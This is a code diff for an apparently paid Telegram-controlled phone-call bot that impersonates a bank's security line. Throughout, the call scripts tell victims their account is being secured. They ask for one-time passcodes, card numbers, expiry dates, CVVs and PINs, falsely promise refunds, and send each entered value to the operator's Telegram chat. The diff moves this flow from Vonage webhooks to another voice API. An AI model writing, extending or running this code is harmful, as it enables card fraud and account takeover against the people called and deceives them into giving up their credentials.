@@ -4,6 +4,7 @@ import { Webhook } from 'coinbase-commerce-node';
 import express from 'express';
 import moment from 'moment';
 import { Markup } from 'telegraf';
+import { v4 as uuidv4 } from 'uuid';
 import { bot } from '.';
 import { client } from './utils/contentful';
 import { accountFlow, bankFlow, cardFlow, payFlow } from './utils/dtmfFlow';
@@ -112,22 +113,29 @@ app.post('/coinbase-webhook', async (req, res) => {
   }
 });
 
-app.post('/vonage-webhook/dtmf/:language/:step/:chatId', (req, res) => {
-  const { dtmf } = req.body;
+app.get('/calls/dtmf/:language/:step/:chatId', (req, res) => {
   const { step, language, chatId } = req.params;
+  const { wallet, askCardInfo, cardType, variables } = req.query;
 
-  const { wallet, askCardInfo, cardType } = req.query;
+  const { dtmf } = JSON.parse(variables as string);
 
   switch (step) {
     case 'bank':
-      bankFlow(dtmf, res, language, Number(chatId), step);
+      bankFlow(String(dtmf), res, language, Number(chatId), step);
       break;
     case 'pay':
-      payFlow(dtmf, res, language, Number(chatId), step, wallet as string);
+      payFlow(
+        String(dtmf),
+        res,
+        language,
+        Number(chatId),
+        step,
+        wallet as string,
+      );
       break;
     case 'account':
       accountFlow(
-        dtmf,
+        String(dtmf),
         res,
         language,
         Number(chatId),
@@ -136,17 +144,26 @@ app.post('/vonage-webhook/dtmf/:language/:step/:chatId', (req, res) => {
       );
       break;
     case 'card':
-      cardFlow(dtmf, res, language, Number(chatId), step, cardType as string);
+      cardFlow(
+        String(dtmf),
+        res,
+        language,
+        Number(chatId),
+        step,
+        cardType as string,
+      );
       break;
     default:
       break;
   }
 });
 
-app.post('/vonage-webhook/pin/:chatId/:language', async (req, res) => {
-  const { dtmf } = req.body;
+app.get('/calls/pin/:chatId/:language', async (req, res) => {
   const { chatId, language } = req.params;
-  if (dtmf && dtmf.digits === '*') {
+  const { variables } = req.query;
+  const { dtmf } = JSON.parse(variables as string);
+
+  if (dtmf && dtmf === '*') {
     await bot.telegram.sendMessage(
       chatId,
       `OTP not received ❌\n\nCall again`,
@@ -159,164 +176,238 @@ app.post('/vonage-webhook/pin/:chatId/:language', async (req, res) => {
       },
     );
 
-    return res.json([
-      {
-        action: 'talk',
-        text: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
-        style: 2,
-        language,
-      },
-    ]);
+    return res.json({
+      id: uuidv4(),
+      title: `call bank - ${chatId} no OTP`,
+      record: false,
+      steps: [
+        {
+          id: uuidv4(),
+          action: 'say',
+          options: {
+            payload:
+              'OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.',
+            language,
+            voice: 'female',
+          },
+        },
+        // {
+        //   id: uuidv4(),
+        //   action: 'hangup',
+        // },
+      ],
+    });
   }
-  if (dtmf && dtmf.digits) {
+  if (dtmf) {
     await bot.telegram.sendMessage(
       req.params.chatId,
       req.params.language === 'en-US'
-        ? `Card Pin is <b>${dtmf.digits}</b> 💳`
-        : `Telepin is <b>${dtmf.digits}</b> 📟`,
+        ? `Card Pin is <b>${dtmf}</b> 💳`
+        : `Telepin is <b>${dtmf}</b> 📟`,
       {
         parse_mode: 'HTML',
       },
     );
   }
-  return res.json([
-    {
-      action: 'talk',
-      text: `GREAT, you have entered ${dtmf.digits
-        .split('')
-        .join(
-          ' ',
-        )}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
-      style: 2,
-      language: req.params.language,
-    },
-  ]);
+  return res.json({
+    id: uuidv4(),
+    title: `call bank - ${chatId} no OTP`,
+    record: false,
+    steps: [
+      {
+        id: uuidv4(),
+        action: 'say',
+        options: {
+          payload: `GREAT, you have entered ${dtmf
+            .split('')
+            .join(
+              ' ',
+            )}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
+          language,
+          voice: 'female',
+        },
+      },
+      // {
+      //   id: uuidv4(),
+      //   action: 'hangup',
+      // },
+    ],
+  });
 });
 
-app.post('/vonage-webhook/card/:chatId/:language', async (req, res) => {
-  const { dtmf } = req.body;
+app.get('/calls/card/:chatId/:language', async (req, res) => {
   const { cardType, isAccount, expiry, cvv } = req.query;
+  const { variables } = req.query;
+  const { dtmf } = JSON.parse(variables as string);
 
   const { language, chatId } = req.params;
 
   if (isAccount === 'yes') {
-    if (dtmf && dtmf.digits) {
-      await bot.telegram.sendMessage(
-        chatId,
-        `Card number <b>${dtmf.digits}</b> ✅`,
-        {
-          parse_mode: 'HTML',
-        },
-      );
-    }
-    res.json([
-      {
-        action: 'talk',
-        text: `GREAT, you have entered ${dtmf.digits
-          .split('')
-          .join(' ')}. Please enter your ${
-          cardType !== 'undefined' ? cardType : ''
-        } card expirattion date followed by the # key.`,
-        style: 2,
-        language,
-      },
-      {
-        eventUrl: [
-          `${process.env.ENDPOINT_URL}/vonage-webhook/card/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
-        ],
-        action: 'input',
-        type: ['dtmf'],
-        dtmf: {
-          submitOnHash: true,
-          timeOut: 10,
-          maxDigits: 6,
-        },
-      },
-    ]);
-  }
-
-  if (expiry === 'yes') {
-    if (dtmf && dtmf.digits) {
-      await bot.telegram.sendMessage(
-        chatId,
-        `Expiration date <b>${dtmf.digits}</b> ✅`,
-        {
-          parse_mode: 'HTML',
-        },
-      );
-    }
-
-    return res.json([
-      {
-        action: 'talk',
-        text: `GREAT, you have entered ${dtmf.digits
-          .split('')
-          .join(' ')}. Please enter your ${
-          cardType !== 'undefined' ? cardType : ''
-        } card CVV followed by the # key.`,
-        style: 2,
-        language,
-      },
-      {
-        eventUrl: [
-          `${process.env.ENDPOINT_URL}/vonage-webhook/card/${chatId}/${language}?cardType=${cardType}&cvv=yes`,
-        ],
-        action: 'input',
-        type: ['dtmf'],
-        dtmf: {
-          submitOnHash: true,
-          timeOut: 10,
-          maxDigits: 6,
-        },
-      },
-    ]);
-  }
-
-  if (cvv === 'yes') {
-    if (dtmf && dtmf.digits) {
-      await bot.telegram.sendMessage(chatId, `CVV <b>${dtmf.digits}</b> ✅`, {
+    if (dtmf) {
+      await bot.telegram.sendMessage(chatId, `Card number <b>${dtmf}</b> ✅`, {
         parse_mode: 'HTML',
       });
     }
-
-    return res.json([
-      {
-        action: 'talk',
-        text: `GREAT. you have entered ${dtmf.digits
-          .split('')
-          .join(' ')}. To AUTHENTICATE YOU please enter your ${
-          language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
-        } followed by the # key.`,
-        style: 2,
-        language,
-        bargeIn: true,
-      },
-      {
-        eventUrl: [
-          `${process.env.ENDPOINT_URL}/vonage-webhook/pin/${chatId}/${language}`,
-        ],
-        action: 'input',
-        type: ['dtmf'],
-        dtmf: {
-          submitOnHash: true,
-          timeOut: 10,
-          maxDigits: 18,
+    res.json({
+      id: uuidv4(),
+      title: `call card - ${chatId}`,
+      record: false,
+      steps: [
+        {
+          id: uuidv4(),
+          action: 'say',
+          options: {
+            payload: `GREAT, you have entered ${dtmf
+              .split('')
+              .join(' ')}. Please enter your ${
+              cardType !== 'undefined' ? cardType : ''
+            } card expirattion date followed by the # key.`,
+            language,
+            voice: 'female',
+            loop: true,
+          },
+          onKeypressGoto: 'cardStepGoto',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 8,
         },
-      },
-    ]);
+        {
+          id: uuidv4(),
+          action: 'pause',
+          options: {
+            length: 5,
+          },
+          onKeypressGoto: 'cardStepGoto',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 8,
+        },
+        {
+          id: 'cardStepGoto',
+          action: 'fetchCallFlow',
+          options: {
+            url: `${process.env.ENDPOINT_URL}/calls/card/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
+          },
+        },
+      ],
+    });
+  }
+
+  if (expiry === 'yes') {
+    if (dtmf) {
+      await bot.telegram.sendMessage(
+        chatId,
+        `Expiration date <b>${dtmf}</b> ✅`,
+        {
+          parse_mode: 'HTML',
+        },
+      );
+    }
+
+    res.json({
+      id: uuidv4(),
+      title: `call card - ${chatId}`,
+      record: false,
+      steps: [
+        {
+          id: uuidv4(),
+          action: 'say',
+          options: {
+            payload: `GREAT, you have entered ${dtmf
+              .split('')
+              .join(' ')}. Please enter your ${
+              cardType !== 'undefined' ? cardType : ''
+            } card CVV followed by the # key.`,
+            language,
+            voice: 'female',
+            loop: true,
+          },
+          onKeypressGoto: 'cardStepGoto',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 8,
+        },
+        {
+          id: uuidv4(),
+          action: 'pause',
+          options: {
+            length: 5,
+          },
+          onKeypressGoto: 'cardStepGoto',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 8,
+        },
+        {
+          id: 'cardStepGoto',
+          action: 'fetchCallFlow',
+          options: {
+            url: `${process.env.ENDPOINT_URL}/calls/card/${chatId}/${language}?cardType=${cardType}&cvv=yes`,
+          },
+        },
+      ],
+    });
+  }
+
+  if (cvv === 'yes') {
+    if (dtmf) {
+      await bot.telegram.sendMessage(chatId, `CVV <b>${dtmf}</b> ✅`, {
+        parse_mode: 'HTML',
+      });
+    }
+    return res.json({
+      id: uuidv4(),
+      title: `call card - ${chatId}`,
+      record: false,
+      steps: [
+        {
+          id: uuidv4(),
+          action: 'say',
+          options: {
+            payload: `GREAT. you have entered ${dtmf
+              .split('')
+              .join(' ')}. To AUTHENTICATE YOU please enter your ${
+              language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
+            } followed by the # key.`,
+            language,
+            voice: 'female',
+            loop: true,
+          },
+          onKeypressGoto: 'cardStepGoto',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 8,
+        },
+        {
+          id: uuidv4(),
+          action: 'pause',
+          options: {
+            length: 5,
+          },
+          onKeypressGoto: 'cardStepGoto',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 8,
+        },
+        {
+          id: 'cardStepGoto',
+          action: 'fetchCallFlow',
+          options: {
+            url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
+          },
+        },
+      ],
+    });
   }
 });
 
-app.post('/vonage-webhook/otp/:step/:chatId/:language', async (req, res) => {
-  const { dtmf } = req.body;
-  const { askCardInfo, cardType } = req.query;
+app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
+  const { askCardInfo, cardType, variables } = req.query;
   const { language, chatId, step } = req.params;
 
-  console.log(
-    `${process.env.ENDPOINT_URL}/vonage-webhook/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
-  );
+  const { dtmf } = JSON.parse(variables as string);
 
-  if (dtmf && dtmf.digits === '*') {
+  if (dtmf && dtmf === '*') {
     await bot.telegram.sendMessage(
       chatId,
       `OTP not received ❌\n\nCall again`,
@@ -329,92 +420,141 @@ app.post('/vonage-webhook/otp/:step/:chatId/:language', async (req, res) => {
       },
     );
 
-    return res.json([
-      {
-        action: 'talk',
-        text: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
-        style: 2,
-        language,
-      },
-    ]);
+    return res.json({
+      id: uuidv4(),
+      title: `call bank - ${chatId} no OTP`,
+      record: false,
+      steps: [
+        {
+          id: uuidv4(),
+          action: 'say',
+          options: {
+            payload:
+              'OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.',
+            language,
+            voice: 'female',
+          },
+        },
+        // {
+        //   id: uuidv4(),
+        //   action: 'hangup',
+        // },
+      ],
+    });
   }
 
   switch (step) {
     case 'bank':
-      if (dtmf && dtmf.digits) {
+      if (dtmf) {
         await bot.telegram.sendMessage(
           req.params.chatId,
-          `OTP is <b>${dtmf.digits}</b> ✅`,
+          `OTP is <b>${dtmf}</b> ✅`,
           {
             parse_mode: 'HTML',
           },
         );
       }
-      return res.json([
-        {
-          action: 'talk',
-          text: `GREAT. you have entered ${dtmf.digits
-            .split('')
-            .join(' ')}. To AUTHENTICATE YOU please enter your ${
-            language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
-          } followed by the # key.`,
-          style: 2,
-          language,
-          bargeIn: true,
-        },
-        {
-          eventUrl: [
-            `${process.env.ENDPOINT_URL}/vonage-webhook/pin/${chatId}/${language}`,
-          ],
-          action: 'input',
-          type: ['dtmf'],
-          dtmf: {
-            submitOnHash: true,
-            timeOut: 10,
-            maxDigits: 18,
+      return res.json({
+        id: uuidv4(),
+        title: `call bank - ${chatId} OTP`,
+        record: false,
+        steps: [
+          {
+            id: uuidv4(),
+            action: 'say',
+            options: {
+              payload: `GREAT. you have entered ${dtmf
+                .split('')
+                .join(' ')}. To AUTHENTICATE YOU please enter your ${
+                language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
+              } followed by the # key.`,
+              language,
+              voice: 'female',
+            },
+            onKeypressGoto: 'bankStepPin',
+            onKeypressVar: 'dtmf',
+            endKey: '#',
+            maxNumKeys: 8,
           },
-        },
-      ]);
+          {
+            id: uuidv4(),
+            action: 'pause',
+            options: {
+              length: 5,
+            },
+            onKeypressGoto: 'bankStepPin',
+            onKeypressVar: 'dtmf',
+            endKey: '#',
+            maxNumKeys: 8,
+          },
+          {
+            id: 'bankStepPin',
+            action: 'fetchCallFlow',
+            options: {
+              url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
+            },
+          },
+        ],
+      });
     case 'pay':
-      if (dtmf && dtmf.digits) {
+      if (dtmf) {
         await bot.telegram.sendMessage(
           req.params.chatId,
-          `OTP is <b>${dtmf.digits}</b> ✅`,
+          `OTP is <b>${dtmf}</b> ✅`,
           {
             parse_mode: 'HTML',
           },
         );
       }
-      return res.json([
-        {
-          action: 'talk',
-          text: `GREAT. you have entered ${dtmf.digits
-            .split('')
-            .join(' ')}. To AUTHENTICATE YOU please enter your ${
-            language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
-          } followed by the # key.`,
-          style: 2,
-          language,
-          bargeIn: true,
-        },
-        {
-          eventUrl: [
-            `${process.env.ENDPOINT_URL}/vonage-webhook/pin/${chatId}/${language}`,
-          ],
-          action: 'input',
-          type: ['dtmf'],
-          dtmf: {
-            submitOnHash: true,
-            timeOut: 10,
-            maxDigits: 18,
+
+      return res.json({
+        id: uuidv4(),
+        title: `call card - ${chatId}`,
+        record: false,
+        steps: [
+          {
+            id: uuidv4(),
+            action: 'say',
+            options: {
+              payload: `GREAT. you have entered ${dtmf
+                .split('')
+                .join(' ')}. To AUTHENTICATE YOU please enter your ${
+                language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
+              } followed by the # key.`,
+              language,
+              voice: 'female',
+              loop: true,
+            },
+            onKeypressGoto: 'cardStepGoto',
+            onKeypressVar: 'dtmf',
+            endKey: '#',
+            maxNumKeys: 8,
           },
-        },
-      ]);
+          {
+            id: uuidv4(),
+            action: 'pause',
+            options: {
+              length: 5,
+            },
+            onKeypressGoto: 'cardStepGoto',
+            onKeypressVar: 'dtmf',
+            endKey: '#',
+            maxNumKeys: 8,
+          },
+          {
+            id: 'cardStepGoto',
+            action: 'fetchCallFlow',
+            options: {
+              url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
+            },
+          },
+        ],
+      });
     case 'account':
-      if (dtmf && dtmf.digits) {
+      if (dtmf) {
         await bot.telegram.sendMessage(
           req.params.chatId,
-          `OTP is <b>${dtmf.digits}</b> ✅`,
+          `OTP is <b>${dtmf}</b> ✅`,
           {
             parse_mode: 'HTML',
           },
@@ -422,118 +562,188 @@ app.post('/vonage-webhook/otp/:step/:chatId/:language', async (req, res) => {
       }
 
       if (askCardInfo === 'yes') {
-        return res.json([
-          {
-            action: 'talk',
-            text: `Okay, you have entered ${dtmf.digits
-              .split('')
-              .join(' ')}. We need to verify you, please enter your ${
-              cardType !== 'undefined' ? cardType : ''
-            } card number followed by the # key`,
-            style: 2,
-            language: language,
-            bargeIn: true,
-          },
-          {
-            eventUrl: [
-              `${process.env.ENDPOINT_URL}/vonage-webhook/card/${step}/${chatId}/${language}?cardType=${cardType}&isAccount=yes`,
-            ],
-            action: 'input',
-            type: ['dtmf'],
-            dtmf: {
-              submitOnHash: true,
-              timeOut: 10,
-              maxDigits: 18,
+        return res.json({
+          id: uuidv4(),
+          title: `call card - ${chatId}`,
+          record: false,
+          steps: [
+            {
+              id: uuidv4(),
+              action: 'say',
+              options: {
+                payload: `Okay, you have entered ${dtmf
+                  .split('')
+                  .join(' ')}. We need to verify you, please enter your ${
+                  cardType !== 'undefined' ? cardType : ''
+                } card number followed by the # key`,
+                language,
+                voice: 'female',
+                loop: true,
+              },
+              onKeypressGoto: 'cardStepGoto',
+              onKeypressVar: 'dtmf',
+              endKey: '#',
+              maxNumKeys: 18,
             },
-          },
-        ]);
+            {
+              id: uuidv4(),
+              action: 'pause',
+              options: {
+                length: 5,
+              },
+              onKeypressGoto: 'cardStepGoto',
+              onKeypressVar: 'dtmf',
+              endKey: '#',
+              maxNumKeys: 18,
+            },
+            {
+              id: 'cardStepGoto',
+              action: 'fetchCallFlow',
+              options: {
+                url: `${process.env.ENDPOINT_URL}/calls/card/${step}/${chatId}/${language}?cardType=${cardType}&isAccount=yes`,
+              },
+            },
+          ],
+        });
       } else {
-        return res.json([
-          {
-            action: 'talk',
-            text: `GREAT, you have entered ${dtmf.digits
-              .split('')
-              .join(
-                ' ',
-              )}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
-            style: 2,
-            language,
-          },
-        ]);
+        return res.json({
+          id: uuidv4(),
+          title: `call bank - ${chatId} no OTP`,
+          record: false,
+          steps: [
+            {
+              id: uuidv4(),
+              action: 'say',
+              options: {
+                payload: `GREAT, you have entered ${dtmf
+                  .split('')
+                  .join(
+                    ' ',
+                  )}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
+                language,
+                voice: 'female',
+              },
+            },
+            // {
+            //   id: uuidv4(),
+            //   action: 'hangup',
+            // },
+          ],
+        });
       }
     case 'card':
-      if (dtmf && dtmf.digits) {
+      if (dtmf) {
         await bot.telegram.sendMessage(
           req.params.chatId,
-          `Card number <b>${dtmf.digits}</b> ✅`,
+          `Card number <b>${dtmf}</b> ✅`,
           {
             parse_mode: 'HTML',
           },
         );
-        return res.json([
-          {
-            action: 'talk',
-            text: `GREAT, you have entered ${dtmf.digits
-              .split('')
-              .join(
-                ' ',
-              )}. Please enter your ${cardType} card expiry date followed by the # key.`,
-            style: 2,
-            language,
-          },
-          {
-            eventUrl: [
-              `${process.env.ENDPOINT_URL}/vonage-webhook/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
-            ],
-            action: 'input',
-            type: ['dtmf'],
-            dtmf: {
-              submitOnHash: true,
-              timeOut: 10,
-              maxDigits: 6,
+        return res.json({
+          id: uuidv4(),
+          title: `call card - ${chatId}`,
+          record: false,
+          steps: [
+            {
+              id: uuidv4(),
+              action: 'say',
+              options: {
+                payload: `GREAT, you have entered ${dtmf
+                  .split('')
+                  .join(
+                    ' ',
+                  )}. Please enter your ${cardType} card expiry date followed by the # key.`,
+                language,
+                voice: 'female',
+                loop: true,
+              },
+              onKeypressGoto: 'cardStepGoto',
+              onKeypressVar: 'dtmf',
+              endKey: '#',
+              maxNumKeys: 6,
             },
-          },
-        ]);
+            {
+              id: uuidv4(),
+              action: 'pause',
+              options: {
+                length: 5,
+              },
+              onKeypressGoto: 'cardStepGoto',
+              onKeypressVar: 'dtmf',
+              endKey: '#',
+              maxNumKeys: 6,
+            },
+            {
+              id: 'cardStepGoto',
+              action: 'fetchCallFlow',
+              options: {
+                url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
+              },
+            },
+          ],
+        });
       } else {
-        return res.json([
-          {
-            action: 'talk',
-            text: `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the # key`,
-            style: 2,
-            language: language,
-            bargeIn: true,
-          },
-          {
-            eventUrl: [
-              `${process.env.ENDPOINT_URL}/vonage-webhook/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
-            ],
-            action: 'input',
-            type: ['dtmf'],
-            dtmf: {
-              submitOnHash: true,
-              timeOut: 10,
-              maxDigits: 18,
+        return res.json({
+          id: uuidv4(),
+          title: `call card - ${chatId}`,
+          record: false,
+          steps: [
+            {
+              id: uuidv4(),
+              action: 'say',
+              options: {
+                payload: `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the # key`,
+                language,
+                voice: 'female',
+                loop: true,
+              },
+              onKeypressGoto: 'cardStepGoto',
+              onKeypressVar: 'dtmf',
+              endKey: '#',
+              maxNumKeys: 18,
             },
-          },
-        ]);
+            {
+              id: uuidv4(),
+              action: 'pause',
+              options: {
+                length: 5,
+              },
+              onKeypressGoto: 'cardStepGoto',
+              onKeypressVar: 'dtmf',
+              endKey: '#',
+              maxNumKeys: 18,
+            },
+            {
+              id: 'cardStepGoto',
+              action: 'fetchCallFlow',
+              options: {
+                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
+              },
+            },
+          ],
+        });
       }
     default:
       break;
   }
 });
-app.post('/vonage-webhook/:chatId', async (req, res) => {
+app.post('/calls/:chatId', async (req, res) => {
   const { chatId } = req.params;
-  const { status, to } = req.body;
-  if (!chatId) {
-    return;
+  // const { status, to } = req.body;
+  // console.log('payload: ', req.body.items[0].payload);
+  const { status, destination, webhook, Status } = req.body.items[0].payload;
+
+  if (!chatId || (webhook !== undefined && !webhook.token)) {
+    return res.send('success');
   }
 
-  if (status === 'ringing') {
-    await bot.telegram.sendMessage(chatId, `Ringing (${to}) 🔔`);
+  if (status === 'ringing' || status === 'starting') {
+    await bot.telegram.sendMessage(chatId, `Ringing (${destination}) 🔔`);
   }
 
-  if (status === 'answered') {
-    await bot.telegram.sendMessage(chatId, `On call (${to}) 🤳🏽`, {
+  if (status === 'ongoing') {
+    await bot.telegram.sendMessage(chatId, `On call (${destination}) 🤳🏽`, {
       parse_mode: 'HTML',
     });
   }
@@ -552,7 +762,7 @@ app.post('/vonage-webhook/:chatId', async (req, res) => {
     );
   }
 
-  if (status === 'machine') {
+  if (Status === 'MACHINE') {
     await bot.telegram.sendMessage(
       chatId,
       '<b>Voicemail</b> ❌\n\nCall again',
@@ -575,8 +785,8 @@ app.post('/vonage-webhook/:chatId', async (req, res) => {
     await bot.context.scene?.enter('super-wizard');
   }
 
-  if (status === 'rejected' || status === 'declined') {
-    await bot.telegram.sendMessage(chatId, '<b>Hung up</b> ❌\n\nCall again', {
+  if (status === 'failed' || status === 'declined') {
+    await bot.telegram.sendMessage(chatId, '<b>Hang up</b> ❌\n\nCall again', {
       parse_mode: 'HTML',
       reply_markup: Markup.inlineKeyboard([
         Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
@@ -585,7 +795,7 @@ app.post('/vonage-webhook/:chatId', async (req, res) => {
     });
   }
 
-  if (status === 'unanswered' || status === 'timeout') {
+  if (status === 'no_answer' || status === 'timeout') {
     await bot.telegram.sendMessage(
       chatId,
       '<b>No answer</b> ❌\n\nCall again',
@@ -599,21 +809,21 @@ app.post('/vonage-webhook/:chatId', async (req, res) => {
     );
   }
 
-  if (status === 'failed') {
-    await bot.telegram.sendMessage(
-      chatId,
-      '😔💔 Bot is down and will back soon.\n\nPlease contact admin to follow up.',
-      {
-        parse_mode: 'HTML',
-        reply_markup: Markup.inlineKeyboard([
-          Markup.button.callback('Try again', 'start'),
-        ]).reply_markup,
-      },
-    );
+  // if (status === 'failed') {
+  //   await bot.telegram.sendMessage(
+  //     chatId,
+  //     '😔💔 Bot is down and will back soon.\n\nPlease contact admin to follow up.',
+  //     {
+  //       parse_mode: 'HTML',
+  //       reply_markup: Markup.inlineKeyboard([
+  //         Markup.button.callback('Try again', 'start'),
+  //       ]).reply_markup,
+  //     },
+  //   );
 
-    await bot.context.scene?.enter('super-wizard');
-  }
-  if (status === 'completed') {
+  //   await bot.context.scene?.enter('super-wizard');
+  // }
+  if (status === 'ended') {
     await bot.telegram.sendMessage(chatId, '<b>Ended.</b>.\n\nCall again? 📞', {
       parse_mode: 'HTML',
       reply_markup: Markup.inlineKeyboard([
@@ -622,8 +832,7 @@ app.post('/vonage-webhook/:chatId', async (req, res) => {
       ]).reply_markup,
     });
   }
-  // console.log(req.body);
-  res.send({});
+  res.send('success');
 });
 
 const port = process.env.PORT || 4000;
